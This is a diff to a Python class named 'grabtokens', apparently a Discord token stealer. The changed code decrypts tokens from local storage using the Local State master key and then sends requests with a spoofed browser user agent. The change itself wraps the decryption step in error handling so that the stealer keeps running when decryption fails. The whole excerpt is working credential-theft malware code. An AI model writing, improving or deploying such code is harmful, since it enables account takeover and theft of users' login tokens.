@@ -193,10 +193,13 @@ class grabtokens():
                                 f'{path}\\{file_name}',
                                 errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(
-                                    base64.b64decode(
-                                        y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(
-                                        self.roaming + f'\\{disc}\\Local State'))
+                                try:
+                                    token = self.decrypt_val(
+                                        base64.b64decode(
+                                            y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(
+                                            self.roaming + f'\\{disc}\\Local State'))
+                                except ValueError:
+                                    pass
                                 try:
                                     r = requests.get(self.baseurl,headers={
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
